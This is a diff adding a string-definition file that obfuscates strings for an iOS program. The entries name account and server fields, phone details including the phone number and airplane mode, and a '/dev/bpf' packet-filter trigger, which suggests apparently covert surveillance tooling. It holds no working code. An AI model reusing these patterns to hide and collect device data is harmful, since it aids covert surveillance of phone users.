@@ -1,0 +1,30 @@
+// This file is the source for obfsucated strings. 
+// format
+// #string[size] STRING_NAME "STRING_VALUE"
+// size is optional. if not provided, it will be calculated
+// additionally, will append a null if the size is less than
+// the given string
+
+// STRINGS
+// ignore this in the users folder"
+
+// for cleanup
+
+#string kACCOUNT    "acct"
+#string kSERVER     "srvr"
+#string kFMT        "%s=%s, "
+
+
+#if __IPHONE_OS_VERSION_MIN_REQUIRED >= 30000
+//These may cause unexpected behavior on OS 2.2.1 phones
+#string PHONE_INFO_3G_ENABLED "P09: %d\n"
+#string PHONE_INFO_ERR "P10: \n"
+#string PHONE_INFO_PHONE_NUM_NAME "P11: %s\n"
+#string PHONE_INFO_PHONE_NUM "P12: %s\n"
+#string PHONE_INFO_AIRPLANE "P13: %d\n"
+
+//bpf trigger related strings
+#string BPF_LOCATION    "/dev/bpf%d"
+
+#endif
+
